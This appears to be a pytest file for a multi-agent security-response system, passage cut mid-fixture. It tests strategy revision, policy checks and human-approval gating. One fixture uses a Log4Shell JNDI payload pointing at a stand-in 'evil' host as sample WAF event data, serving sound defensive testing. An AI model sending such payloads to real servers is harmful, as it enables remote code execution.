from agent_brain.agents import CoordinatorAgent, PlannerRevisionAgent
from agent_brain.models import (
    ActionType,
    BlastRadius,
    Challenge,
    DebateState,
    DefenseAction,
    DefenseStrategy,
    GeneratedBy,
    MCPToolCall,
    PlannerTopologyMetadata,
    RedTeamFindings,
    ResidualAttackPath,
    RiskLevel,
    RollbackPlan,
    SecurityEvent,
    Severity,
    StrategyScope,
    StrategyStatus,
    TargetLayer,
    ThreatType,
)
from agent_brain.services import MockLLMClient


# ---------------------------------------------------------------------------
# Fake PolicyMCPClient used by Coordinator policy-integration tests.
# Mirrors the public surface of ``PolicyMCPClient`` without touching MCP.
# ---------------------------------------------------------------------------


class _FakePolicyClient:
    """Stand-in for PolicyMCPClient: returns a canned envelope per tool."""

    def __init__(self, *, validate_envelope: dict, enabled: bool = True) -> None:
        self.enabled = enabled
        self._validate_envelope = validate_envelope
        self.calls: list[tuple[str, dict]] = []

    async def validate_strategy(self, strategy: dict) -> dict:
        self.calls.append(("validate_strategy", strategy))
        return self._validate_envelope

    async def check_business_constraints(self, strategy: dict) -> dict:
        return {"success": True, "data": {}, "message": "ok"}

    async def require_human_approval(self, strategy: dict) -> dict:
        return {"success": True, "data": {}, "message": "ok"}

    async def suggest_safer_strategy(self, strategy: dict) -> dict:
        return {"success": True, "data": {}, "message": "ok"}

    async def aclose(self) -> None:
        return None


# ---------------------------------------------------------------------------
# 测试公共构造工具
# ---------------------------------------------------------------------------


def _base_state() -> DebateState:
    event = SecurityEvent(
        eventId="evt-rc-001",
        sourceType="WAF",
        subject="public-gateway",
        action="http_request",
        object="/api/search",
        context={"payload": "${jndi:ldap://evil/a}", "namespace": "edge"},
        severity=Severity.CRITICAL,
        riskScore=0.92,
        labels=["log4shell"],
    )
    proposal = DefenseStrategy(
        strategyId="stg-rc-001-p1",
        threatType=ThreatType.PRIVILEGE_ESCALATION,
        targetLayer=TargetLayer.APPLICATION,
        actions=[DefenseAction(type=ActionType.APPLY_WAF_RULE, target="/api/search", parameters={})],
        scope=StrategyScope(assets=["public-gateway"], namespaces=["edge"], tenantId="tenant-a"),
        ttl=1200,
        rollbackPlan=RollbackPlan(planId="rb-rc-001-p1", steps=["rollback"], triggerCondition="manual"),
        confidence=0.78,
        rationale="initial",
        generatedBy=GeneratedBy.PLANNER,
        approved=False,
    )
    return DebateState(
        debateId="deb-rc-001",
        securityEvent=event,
        plannerProposal=proposal,
        redTeamChallenges=[
            Challenge(
                type="bypass",
                title="Base64 encoding bypass",
                description="regex waf may miss encoded payload",
                severity=Severity.HIGH,
            ),
            Challenge(
                type="root_cause",
                title="Root cause not eliminated",
                description="symptom only",
                severity=Severity.HIGH,
            ),
        ],
        round=1,
        maxRounds=2,
    )


def _state_with_topology_findings() -> DebateState:
    """构造一个含 plannerMetadata + redTeamFindings 的完整状态，用于拓扑修复测试。"""
    state = _base_state()
    # 改成 ISOLATE_POD 命中 CRITICAL 资产 + BLOCK_IP 全端口 的策略
    state.plannerProposal = DefenseStrategy(
        strategyId="stg-rc-002-p1",
        threatType=ThreatType.LATERAL_MOVEMENT,
        targetLayer=TargetLayer.WORKLOAD,
        actions=[
            DefenseAction(type=ActionType.ISOLATE_POD, target="app-payment-01", parameters={}),
            DefenseAction(type=ActionType.BLOCK_IP, target="203.0.113.9", parameters={}),
        ],
        scope=StrategyScope(
            assets=["app-payment-01", "public-gateway"], namespaces=["payments"], tenantId="tenant-a"
        ),
        ttl=10,  # 故意设短，触发 ttl_extended_to_1800s
        rollbackPlan=RollbackPlan(planId="rb-empty", steps=[], triggerCondition=""),
        confidence=0.7,
        rationale="lateral movement containment",
        generatedBy=GeneratedBy.PLANNER,
        approved=False,
    )
    state.securityEvent.context = {
        "srcIp": "203.0.113.9",
        "dstIp": "10.30.1.10",
    }
    state.plannerMetadata = PlannerTopologyMetadata(
        topology_context_used=True,
        affected_assets=["app-payment-01"],
        expected_blast_radius=BlastRadius.HIGH,
        topology_evidence=["dstIp 10.30.1.10 maps to db-primary-01 (CRITICAL)"],
        mcp_tool_calls=[
            MCPToolCall(tool="get_asset_info", arguments={"ip_or_asset_id": "10.30.1.10"}, success=True, summary="db-primary-01"),
            MCPToolCall(tool="get_critical_assets", arguments={}, success=True, summary="3 critical assets"),
        ],
    )
    state.redTeamFindings = RedTeamFindings(
        topology_based_findings=[
            "strategy impact level evaluated as CRITICAL",
            "strategy directly impacts CRITICAL assets: app-payment-01",
            "strategy may break DMZ_TO_DATABASE path (dmz-web-01->dmz-api-01->app-payment-01->db-primary-01)",
        ],
        residual_attack_paths=[
            ResidualAttackPath(
                source="203.0.113.9",
                target="10.30.1.10",
                nodes=["dmz-web-01", "dmz-api-01", "app-auth-01", "db-primary-01"],
                summary="Path dmz-web-01 -> dmz-api-01 -> app-auth-01 -> db-primary-01 is not covered by current strategy",
            )
        ],
        business_impact_risks=[
            "Legitimate business traffic on path dmz-api-01->app-payment-01->db-primary-01 (type=DMZ_TO_DATABASE, severity=HIGH) may be disrupted",
            "CRITICAL asset app-payment-01 would be disrupt; production service interruption risk",
        ],
        recommended_constraints=[
            "TTL=10s is too short to be effective; raise TTL to at least 60s or rely on persistent rule",
            "Rollback plan steps are empty; add explicit rollback steps",
            "Rollback plan has no trigger condition; specify a trigger",
            "Replace ISOLATE/BLOCK on CRITICAL assets with RESTRICT_EGRESS or APPLY_FIREWALL_RULE",
            "Add allowlist for legitimate DMZ_TO_DATABASE traffic",
            "BLOCK_IP 203.0.113.9 is full-port; restrict to specific ports/protocols",
            "Found 1 residual attack path(s); extend isolation to upstream/parallel nodes",
        ],
        mcp_tool_calls=[
            MCPToolCall(tool="evaluate_strategy_impact", arguments={"strategyId": "stg-rc-002-p1"}, success=True, summary="impact_level=CRITICAL"),
            MCPToolCall(tool="get_neighbors", arguments={"ip_or_asset_id": "app-payment-01"}, success=True, summary="5 neighbors"),
            MCPToolCall(tool="find_paths", arguments={"source": "203.0.113.9", "target": "10.30.1.10"}, success=True, summary="3 paths"),
        ],
    )
    return state


# ---------------------------------------------------------------------------
# 旧回归：保证 challenge-driven 修订仍然工作
# ---------------------------------------------------------------------------


def test_revision_covers_part_of_challenges():
    state = _base_state()
    revised = PlannerRevisionAgent(MockLLMClient()).run(state)
    assert revised.revisedProposal is not None
    assert revised.revisedProposal.rationale
    waf = revised.revisedProposal.actions[0]
    assert waf.parameters.get("decodeBase64") is True


def test_coordinator_escalates_high_risk_low_confidence():
    state = _base_state()
    state = PlannerRevisionAgent(MockLLMClient()).run(state)
    assert state.revisedProposal is not None
    state.revisedProposal.confidence = 0.6
    state = CoordinatorAgent(MockLLMClient()).run(state)
    assert state.finalDecision is not None
    assert state.finalDecision.nextAction.value == "REQUEST_HUMAN_REVIEW"
    # 新字段也应被填充（至少不为 None）
    assert state.finalDecision.riskLevel is not None
    assert state.finalDecision.decisionReasoning


# ---------------------------------------------------------------------------
# 拓扑驱动修订
# ---------------------------------------------------------------------------


def test_revision_applies_topology_findings_fixes():
    state = _state_with_topology_findings()
    revised = PlannerRevisionAgent(MockLLMClient()).run(state)
    rev = revised.revisedProposal
    assert rev is not None

    # 1) TTL 被拉长到 >= 1800
    assert rev.ttl >= 1800

    # 2) Rollback 步骤与触发条件被补全
    assert rev.rollbackPlan.steps  # 不为空
    assert rev.rollbackPlan.triggerCondition  # 不为空

    # 3) ISOLATE_POD app-payment-01 被替换为 RESTRICT_EGRESS
    targets_egress = [
        a for a in rev.actions
        if a.type == ActionType.RESTRICT_EGRESS and a.target == "app-payment-01"
    ]
    assert targets_egress, "CRITICAL 资产的 ISOLATE 应被降级为 RESTRICT_EGRESS"
    assert targets_egress[0].parameters.get("originalAction") == "ISOLATE_POD"

    # 4) BLOCK_IP 加入 port/protocol 限制
    block_ips = [a for a in rev.actions if a.type == ActionType.BLOCK_IP]
    assert block_ips
    assert block_ips[0].parameters.get("port") == 443
    assert block_ips[0].parameters.get("protocol") == "tcp"

    # 5) 业务路径白名单被打到 action 元数据
    has_allowlist = any(
        "DMZ_TO_DATABASE" in (a.parameters.get("allowlistedFlows") or [])
        for a in rev.actions
    )
    assert has_allowlist

    # 6) 残余攻击路径触发：源 IP 被加 RESTRICT_EGRESS
    src_egress = [
        a for a in rev.actions
        if a.type == ActionType.RESTRICT_EGRESS and a.target == "203.0.113.9"
    ]
    assert src_egress
    assert "deny-all-egress" in str(src_egress[0].parameters)

    # 7) scope.assets 移除 CRITICAL 资产 app-payment-01
    assert "app-payment-01" not in rev.scope.assets

    # 8) rationale 含 topology_fixes 标签
    assert "topology_fixes" in rev.rationale


# ---------------------------------------------------------------------------
# Coordinator 拓扑/MCP 整合输出
# ---------------------------------------------------------------------------


def test_coordinator_aggregates_mcp_trace_and_topology_summary():
    state = _state_with_topology_findings()
    state = PlannerRevisionAgent(MockLLMClient()).run(state)
    state = CoordinatorAgent(MockLLMClient()).run(state)
    fd = state.finalDecision
    assert fd is not None

    # mcpTrace 聚合 Planner(2) + Red-Team(3) = 5 条
    assert len(fd.mcpTrace) == 5
    tool_names = [c.tool for c in fd.mcpTrace]
    assert "get_asset_info" in tool_names
    assert "evaluate_strategy_impact" in tool_names
    assert "find_paths" in tool_names

    # topologyContextSummary 含必要字段
    s = fd.topologyContextSummary
    assert s["topology_context_used"] is True
    assert s["expected_blast_radius"] == "high"
    assert s["affected_assets"] == ["app-payment-01"]
    assert "red_team" in s
    assert s["red_team"]["residual_attack_paths"]
    assert s["red_team"]["business_impact_risks"]

    # executionConstraints 至少含原始 recommended_constraints + canary 提示
    constraints = fd.executionConstraints
    assert any("TTL=10s" in c for c in constraints)
    assert any("canary rollout" in c.lower() for c in constraints)

    # riskLevel 综合应为 CRITICAL（severity=CRITICAL 直接拉满）
    assert fd.riskLevel == RiskLevel.CRITICAL

    # decisionReasoning 多行可读
    assert "risk_level=critical" in fd.decisionReasoning
    assert "topology" in fd.decisionReasoning


def test_coordinator_returns_empty_mcp_trace_when_disabled():
    """没有 plannerMetadata + 没有 redTeamFindings 时 mcpTrace 必须是空数组。"""
    state = _base_state()
    state = PlannerRevisionAgent(MockLLMClient()).run(state)
    state = CoordinatorAgent(MockLLMClient()).run(state)
    fd = state.finalDecision
    assert fd is not None
    assert fd.mcpTrace == []
    # topologyContextSummary 仍然返回结构（但内容为默认空）
    assert fd.topologyContextSummary["topology_context_used"] is False
    assert fd.topologyContextSummary["affected_assets"] == []


# ---------------------------------------------------------------------------
# Orchestrator 兼容性：旧字段 + 新 coordinatorDecision
# ---------------------------------------------------------------------------


def test_orchestrator_returns_coordinator_decision_envelope():
    from agent_brain.services import DebateOrchestrator
    from agent_brain.main import _build_mock_event

    orchestrator = DebateOrchestrator(llm=MockLLMClient())
    result = orchestrator.process_event(_build_mock_event())

    # 旧字段全部保留
    assert "finalStrategy" in result
    assert "unresolvedChallenges" in result
    assert "nextAction" in result
    assert "decisionReason" in result
    assert "verification" in result
    assert "actuatorResponse" in result

    # 新字段 coordinatorDecision 必须存在且 14 个 key 完整（Phase 5 新增 3 个）
    assert "coordinatorDecision" in result
    cd = result["coordinatorDecision"]
    assert set(cd.keys()) == {
        "final_strategy",
        "decision_reasoning",
        "risk_level",
        "confidence",
        "topology_context_summary",
        "mcp_trace",
        "rollback_plan",
        "execution_constraints",
        "status",
        "human_approval_required",
        "policy_validation",
        "auto_execution_allowed",
        "approval_reason",
        "safety_checks",
    }
    # 没启用 MCP -> mcp_trace 为空数组
    assert cd["mcp_trace"] == []
    # confidence 与 strategy.confidence 一致
    assert cd["confidence"] == result["finalStrategy"]["confidence"]
    # rollback_plan 不为 None（demo 策略均带回滚计划）
    assert cd["rollback_plan"] is not None
    assert "planId" in cd["rollback_plan"]
    # risk_level 必须是合法枚举值
    assert cd["risk_level"] in {"low", "medium", "high", "critical"}
    # Phase 3: status / human_approval_required 必须存在且类型正确
    assert cd["status"] in {
        "pending_validation",
        "approved_for_execution",
        "requires_approval",
        "needs_revision",
        "rejected",
    }
    assert isinstance(cd["human_approval_required"], bool)
    # Phase 3: policy_validation 默认空（未启用 policy MCP）
    pv = cd["policy_validation"]
    assert pv["mcp_called"] is False
    assert pv["valid"] is True
    assert pv["violations"] == []
    assert pv["warnings"] == []
    assert pv["suggestions"] == []
    # final_strategy 上挂载了 status 与 human_approval_required（FE 直接用）
    assert cd["final_strategy"]["status"] == cd["status"]
    assert cd["final_strategy"]["human_approval_required"] == cd["human_approval_required"]
    # Phase 5: final_strategy 上挂载完整的人工确认边界字段
    assert cd["final_strategy"]["auto_execution_allowed"] == cd["auto_execution_allowed"]
    assert cd["final_strategy"]["approval_reason"] == cd["approval_reason"]
    assert cd["final_strategy"]["safety_checks"] == cd["safety_checks"]
    assert cd["final_strategy"]["execution_constraints"] == cd["execution_constraints"]
    # Phase 5: safety_checks 永远是 6 条结构化判定
    assert isinstance(cd["safety_checks"], list)
    assert len(cd["safety_checks"]) == 6
    expected_check_ids = {
        "critical_assets_impacted",
        "impact_level_high",
        "destructive_action_type",
        "rollback_plan_present",
        "ttl_minutes_present",
        "policy_human_approval_not_required",
    }
    assert {c["id"] for c in cd["safety_checks"]} == expected_check_ids
    # 任一 safety_check 失败 -> human_approval_required True
    failed = [c for c in cd["safety_checks"] if not c["passed"]]
    if failed:
        assert cd["human_approval_required"] is True
        assert cd["auto_execution_allowed"] is False
        assert cd["approval_reason"], "approval_reason must be non-empty when checks fail"
    # auto_execution_allowed 必须与 status / human_approval_required 强一致
    if cd["auto_execution_allowed"]:
        assert cd["status"] == "approved_for_execution"
        assert cd["human_approval_required"] is False
    if cd["human_approval_required"]:
        assert cd["auto_execution_allowed"] is False


# ---------------------------------------------------------------------------
# Phase 3: Policy MCP integration in Coordinator
# ---------------------------------------------------------------------------


def _light_state() -> DebateState:
    """Build a minimal state where the Coordinator decides APPROVE without escalation.

    The base fixture in this file is built with severity=CRITICAL + low confidence,
    which forces ESCALATE; for clean policy-validation paths we want the upstream
    decision to be APPROVE so that ``status`` solely reflects the policy outcome.
    """
    event = SecurityEvent(
        eventId="evt-rc-policy-001",
        sourceType="WAF",
        subject="public-gateway",
        action="http_request",
        object="/api/login",
        context={},
        severity=Severity.MEDIUM,
        riskScore=0.4,
        labels=[],
    )
    proposal = DefenseStrategy(
        strategyId="stg-rc-policy-001",
        threatType=ThreatType.PHISHING,
        targetLayer=TargetLayer.APPLICATION,
        actions=[
            DefenseAction(
                type=ActionType.APPLY_WAF_RULE,
                target="/api/login",
                parameters={"action": "block", "path": "/api/login"},
            )
        ],
        scope=StrategyScope(assets=["dmz-api-01"], namespaces=["edge"], tenantId="tenant-a"),
        ttl=1800,
        rollbackPlan=RollbackPlan(planId="rb-policy", steps=["disable_rule"], triggerCondition="manual"),
        confidence=0.92,  # >= 0.85 threshold
        rationale="initial",
        generatedBy=GeneratedBy.PLANNER,
        approved=False,
    )
    return DebateState(
        debateId="deb-rc-policy-001",
        securityEvent=event,
        plannerProposal=proposal,
        revisedProposal=proposal,
        unresolvedChallenges=[],
        round=1,
        maxRounds=2,
    )


def test_coordinator_approves_for_execution_when_policy_valid():
    """policy MCP returns valid=True, requires_human_approval=False -> APPROVED_FOR_EXECUTION."""
    state = _light_state()
    fake = _FakePolicyClient(
        validate_envelope={
            "success": True,
            "data": {
                "valid": True,
                "violations": [],
                "warnings": [],
                "requires_human_approval": False,
                "suggestions": [],
            },
            "message": "validate_strategy: valid=true",
        }
    )
    coord = CoordinatorAgent(MockLLMClient(), policy_client=fake)
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    assert fd.status == StrategyStatus.APPROVED_FOR_EXECUTION
    assert fd.humanApprovalRequired is False
    assert fd.policyValidation.mcp_called is True
    assert fd.policyValidation.valid is True
    # policy validate_strategy must show up in the trace exactly once
    policy_calls = [c for c in fd.mcpTrace if c.server == "policy-mcp-server"]
    assert len(policy_calls) == 1
    assert policy_calls[0].tool == "validate_strategy"
    assert policy_calls[0].success is True
    # No "auto-execution disabled" / "blocked" lines should be present here
    blockers = [c for c in fd.executionConstraints if "blocked" in c.lower() or "disabled" in c.lower()]
    assert blockers == []
    # Underlying strategy is still flagged approved by upstream because we
    # entered ENTER_VERIFICATION; policy-valid path keeps that intact.
    assert state.revisedProposal is not None
    assert state.revisedProposal.approved is True


def test_coordinator_marks_needs_revision_when_policy_invalid():
    """valid=False with critical violations -> NEEDS_REVISION + auto-execution blocked."""
    state = _light_state()
    fake = _FakePolicyClient(
        validate_envelope={
            "success": True,
            "data": {
                "valid": False,
                "violations": [
                    {
                        "rule_id": "RULE-001",
                        "rule_name": "no_full_block_on_critical_database",
                        "severity": "critical",
                        "action_index": 0,
                        "action_type": "BLOCK_IP",
                        "target": "db-primary-01",
                        "message": "BLOCK_IP on critical DB without scope",
                        "remediation": "use ingress_only",
                    },
                    {
                        "rule_id": "RULE-007",
                        "rule_name": "critical_asset_action_requires_human_approval",
                        "severity": "critical",
                        "action_index": 0,
                        "action_type": "BLOCK_IP",
                        "target": "db-primary-01",
                        "message": "no human_approval flag",
                        "remediation": "set metadata.human_approval=true",
                    },
                ],
                "warnings": [],
                "requires_human_approval": True,
                "suggestions": [
                    {"rule_id": "RULE-001", "title": "Constrain", "detail": "x", "patch": {}}
                ],
            },
            "message": "validate_strategy: valid=false",
        }
    )
    coord = CoordinatorAgent(MockLLMClient(), policy_client=fake)
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    assert fd.status == StrategyStatus.NEEDS_REVISION
    # The strategy MUST not stay approved when revision is required
    assert state.revisedProposal is not None
    assert state.revisedProposal.approved is False
    # An explicit blocker line must show up in execution_constraints
    assert any("Auto-execution blocked" in c for c in fd.executionConstraints)
    # Critical rule ids surfaced for the executor / UI
    assert any("RULE-001" in c for c in fd.executionConstraints)
    # PolicyValidation contents propagated unchanged
    assert len(fd.policyValidation.violations) == 2
    assert len(fd.policyValidation.suggestions) == 1
    # decisionReasoning surfaces the policy outcome
    assert "policy:" in fd.decisionReasoning
    assert f"status={StrategyStatus.NEEDS_REVISION.value}" in fd.decisionReasoning


def test_coordinator_marks_requires_approval_when_human_approval_needed():
    """valid=True + requires_human_approval=True -> REQUIRES_APPROVAL with human flag."""
    state = _light_state()
    fake = _FakePolicyClient(
        validate_envelope={
            "success": True,
            "data": {
                "valid": True,
                "violations": [],
                "warnings": [],
                "requires_human_approval": True,
                "suggestions": [],
            },
            "message": "validate_strategy: valid=true, requires_human_approval=true",
        }
    )
    coord = CoordinatorAgent(MockLLMClient(), policy_client=fake)
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    assert fd.status == StrategyStatus.REQUIRES_APPROVAL
    assert fd.humanApprovalRequired is True
    assert state.revisedProposal is not None
    assert state.revisedProposal.approved is False
    assert any("human approval" in c.lower() for c in fd.executionConstraints)


def test_coordinator_falls_back_when_policy_call_fails():
    """policy mcp returns success=False -> mcp_error is captured, status uses upstream signal."""
    state = _light_state()
    fake = _FakePolicyClient(
        validate_envelope={
            "success": False,
            "data": None,
            "message": "policy mcp connection refused",
        }
    )
    coord = CoordinatorAgent(MockLLMClient(), policy_client=fake)
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    # Failure leaves mcp_called=True but mcp_error populated
    assert fd.policyValidation.mcp_called is True
    assert fd.policyValidation.mcp_error is not None
    # When mcp_called=True but valid stays True (default) and no
    # requires_human_approval flag, fallback uses upstream nextAction.
    # _light_state -> ENTER_VERIFICATION -> APPROVED_FOR_EXECUTION
    assert fd.status == StrategyStatus.APPROVED_FOR_EXECUTION
    # The failed call still appears in mcp_trace for auditing
    policy_calls = [c for c in fd.mcpTrace if c.server == "policy-mcp-server"]
    assert len(policy_calls) == 1
    assert policy_calls[0].success is False


def test_coordinator_no_policy_client_keeps_legacy_behavior():
    """Without a policy_client the FinalDecision keeps the empty PolicyValidation."""
    state = _light_state()
    coord = CoordinatorAgent(MockLLMClient())  # no policy client
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    assert fd.policyValidation.mcp_called is False
    assert fd.policyValidation.valid is True
    assert fd.policyValidation.violations == []
    # mcp_trace should not contain any policy-mcp-server entries
    assert all(c.server != "policy-mcp-server" for c in fd.mcpTrace)
    # status falls through to APPROVED_FOR_EXECUTION because the upstream
    # decision is APPROVE / ENTER_VERIFICATION on the light fixture.
    assert fd.status == StrategyStatus.APPROVED_FOR_EXECUTION


# ---------------------------------------------------------------------------
# Phase 5: Human-approval boundary
# ---------------------------------------------------------------------------


def _safety_check(fd, check_id: str):
    """Tiny helper to find one safety_check entry by stable id."""
    for c in fd.safetyChecks:
        if c.id == check_id:
            return c
    raise AssertionError(f"safety check {check_id!r} missing")


def test_low_risk_strategy_allows_auto_execution():
    """Light fixture (WAF rule, MEDIUM event, full TTL/rollback) -> auto-exec OK.

    All 6 safety checks must pass and auto_execution_allowed must be True.
    """
    state = _light_state()
    coord = CoordinatorAgent(MockLLMClient())  # no policy client
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    assert fd.status == StrategyStatus.APPROVED_FOR_EXECUTION
    assert fd.humanApprovalRequired is False
    assert fd.autoExecutionAllowed is True
    assert fd.approvalReason == []
    # All 6 safety checks must be present and passed
    assert len(fd.safetyChecks) == 6
    for c in fd.safetyChecks:
        assert c.passed is True, f"check {c.id} unexpectedly failed: {c.detail}"


def test_critical_event_severity_forces_human_approval():
    """Trigger 1: SecurityEvent.severity=CRITICAL -> critical_assets_impacted fails."""
    state = _light_state()
    state.securityEvent.severity = Severity.CRITICAL
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    chk = _safety_check(fd, "critical_assets_impacted")
    assert chk.passed is False
    assert "CRITICAL" in chk.detail.upper()
    assert fd.humanApprovalRequired is True
    assert fd.autoExecutionAllowed is False
    # Status escalates from APPROVED_FOR_EXECUTION to REQUIRES_APPROVAL
    assert fd.status == StrategyStatus.REQUIRES_APPROVAL
    # The reason text bubbles up
    assert any("critical assets" in r.lower() for r in fd.approvalReason)


def test_red_team_findings_trigger_critical_check():
    """Trigger 1 alt: Red-Team topology findings flag CRITICAL assets."""
    state = _light_state()
    state.redTeamFindings = RedTeamFindings(
        topology_based_findings=["strategy directly impacts CRITICAL assets: db-primary-01"],
    )
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    chk = _safety_check(fd, "critical_assets_impacted")
    assert chk.passed is False
    assert fd.humanApprovalRequired is True


def test_high_blast_radius_forces_human_approval():
    """Trigger 2: PlannerTopologyMetadata.expected_blast_radius=HIGH."""
    state = _light_state()
    state.plannerMetadata = PlannerTopologyMetadata(
        topology_context_used=True,
        expected_blast_radius=BlastRadius.HIGH,
    )
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    chk = _safety_check(fd, "impact_level_high")
    assert chk.passed is False
    assert "blast_radius=high" in chk.detail
    assert fd.humanApprovalRequired is True
    assert fd.autoExecutionAllowed is False


def test_isolate_host_action_forces_human_approval():
    """Trigger 3a: ISOLATE_HOST is unconditionally destructive."""
    state = _light_state()
    assert state.revisedProposal is not None
    state.revisedProposal.actions = [
        DefenseAction(type=ActionType.ISOLATE_HOST, target="db-primary-01")
    ]
    state.plannerProposal = state.revisedProposal
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    chk = _safety_check(fd, "destructive_action_type")
    assert chk.passed is False
    assert "isolate_host" in chk.detail
    assert fd.humanApprovalRequired is True


def test_firewall_deny_all_action_forces_human_approval():
    """Trigger 3b: APPLY_FIREWALL_RULE without 5-tuple -> firewall_deny_all."""
    state = _light_state()
    assert state.revisedProposal is not None
    # No source/destination/port/protocol -> treated as deny-all
    state.revisedProposal.actions = [
        DefenseAction(
            type=ActionType.APPLY_FIREWALL_RULE,
            target="zone-prod",
            parameters={},
        )
    ]
    state.plannerProposal = state.revisedProposal
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    chk = _safety_check(fd, "destructive_action_type")
    assert chk.passed is False
    assert "firewall_deny_all" in chk.detail
    assert fd.humanApprovalRequired is True


def test_firewall_with_full_5_tuple_does_not_trigger():
    """Negative case: APPLY_FIREWALL_RULE with full 5-tuple is fine-grained."""
    state = _light_state()
    assert state.revisedProposal is not None
    state.revisedProposal.actions = [
        DefenseAction(
            type=ActionType.APPLY_FIREWALL_RULE,
            target="zone-prod",
            parameters={
                "source": "203.0.113.9",
                "destination": "10.30.1.10",
                "port": 443,
                "protocol": "tcp",
            },
        )
    ]
    state.plannerProposal = state.revisedProposal
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    chk = _safety_check(fd, "destructive_action_type")
    assert chk.passed is True


def test_scale_down_critical_service_forces_human_approval():
    """Trigger 3c: SCALE_PROTECTION with direction=down on critical service."""
    state = _light_state()
    assert state.revisedProposal is not None
    state.revisedProposal.actions = [
        DefenseAction(
            type=ActionType.SCALE_PROTECTION,
            target="critical-payment-service",
            parameters={"direction": "down"},
        )
    ]
    state.plannerProposal = state.revisedProposal
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    chk = _safety_check(fd, "destructive_action_type")
    assert chk.passed is False
    assert "scale_down_critical_service" in chk.detail
    assert fd.humanApprovalRequired is True


def test_missing_rollback_plan_forces_human_approval():
    """Trigger 4: rollback plan with empty steps + blank trigger condition."""
    state = _light_state()
    assert state.revisedProposal is not None
    state.revisedProposal.rollbackPlan = RollbackPlan(
        planId="rb-empty", steps=[], triggerCondition=""
    )
    state.plannerProposal = state.revisedProposal
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    chk = _safety_check(fd, "rollback_plan_present")
    assert chk.passed is False
    assert "rollback_plan effectively missing" in chk.detail
    assert fd.humanApprovalRequired is True
    assert fd.autoExecutionAllowed is False


def test_ttl_below_one_minute_forces_human_approval():
    """Trigger 5: ttl < 60s is treated as missing minute-level TTL."""
    state = _light_state()
    assert state.revisedProposal is not None
    state.revisedProposal.ttl = 30  # below one minute
    state.plannerProposal = state.revisedProposal
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    chk = _safety_check(fd, "ttl_minutes_present")
    assert chk.passed is False
    assert "below 60s" in chk.detail
    assert fd.humanApprovalRequired is True


def test_policy_requires_human_approval_forces_human_approval():
    """Trigger 6: policy MCP returns requires_human_approval=true."""
    state = _light_state()
    fake = _FakePolicyClient(
        validate_envelope={
            "success": True,
            "data": {
                "valid": True,
                "violations": [],
                "warnings": [],
                "requires_human_approval": True,
                "suggestions": [],
            },
            "message": "needs human approval",
        }
    )
    coord = CoordinatorAgent(MockLLMClient(), policy_client=fake)
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    chk = _safety_check(fd, "policy_human_approval_not_required")
    assert chk.passed is False
    assert "requires_human_approval=true" in chk.detail
    assert fd.humanApprovalRequired is True
    assert fd.autoExecutionAllowed is False
    # When policy comes back valid=True we get REQUIRES_APPROVAL (not NEEDS_REVISION)
    assert fd.status == StrategyStatus.REQUIRES_APPROVAL


def test_safety_checks_force_constraint_line_when_blocked():
    """Any failed check must produce a blocking line in execution_constraints."""
    state = _light_state()
    state.securityEvent.severity = Severity.CRITICAL
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    blockers = [
        c for c in fd.executionConstraints
        if "auto-execution" in c.lower() and ("blocked" in c.lower() or "disabled" in c.lower())
    ]
    assert blockers, "expected a blocking line in execution_constraints"


def test_decision_reasoning_surfaces_safety_summary():
    """decision_reasoning must mention safety / approval signals."""
    state = _light_state()
    state.securityEvent.severity = Severity.CRITICAL
    coord = CoordinatorAgent(MockLLMClient())
    state = coord.run(state)
    fd = state.finalDecision
    assert fd is not None
    assert "safety:" in fd.decisionReasoning
    assert "approval:" in fd.decisionReasoning
    assert "human_required=Y" in fd.decisionReasoning
    assert "auto_execution=N" in fd.decisionReasoning


def test_orchestrator_skips_actuator_when_not_auto_executable():
    """When human approval required, orchestrator must NOT call actuator."""
    from agent_brain.services import DebateOrchestrator

    class _ApprovalForcingPolicy:
        enabled = True

        async def validate_strategy(self, strategy: dict) -> dict:
            return {
                "success": True,
                "data": {
                    "valid": True,
                    "violations": [],
                    "warnings": [],
                    "requires_human_approval": True,
                    "suggestions": [],
                },
                "message": "needs approval",
            }

        async def aclose(self) -> None:
            return None

    from agent_brain.main import _build_mock_event

    orchestrator = DebateOrchestrator(
        llm=MockLLMClient(), policy_client=_ApprovalForcingPolicy()
    )
    result = orchestrator.process_event(_build_mock_event())
    # Coordinator must mark auto_execution_allowed=False
    cd = result["coordinatorDecision"]
    assert cd["auto_execution_allowed"] is False
    assert cd["human_approval_required"] is True
    # Verification + actuator must short-circuit
    assert result["verification"]["passed"] is False
    assert result["actuatorResponse"] == {"status": "SKIPPED"}


# ---------------------------------------------------------------------------
# Coordinator action deduplication
# ---------------------------------------------------------------------------


def _state_duplicate_restrict_egress() -> DebateState:
    """Same target + same semantic egress bucket; second policy is strictly stronger."""
    event = SecurityEvent(
        eventId="evt-dedup-re-001",
        sourceType="EDR",
        subject="pod/svc-a",
        action="connect",
        object="8.8.8.8:443",
        context={},
        severity=Severity.MEDIUM,
        riskScore=0.42,
        labels=[],
    )
    proposal = DefenseStrategy(
        strategyId="stg-dedup-re-001",
        threatType=ThreatType.LATERAL_MOVEMENT,
        targetLayer=TargetLayer.WORKLOAD,
        actions=[
            DefenseAction(
                type=ActionType.RESTRICT_EGRESS,
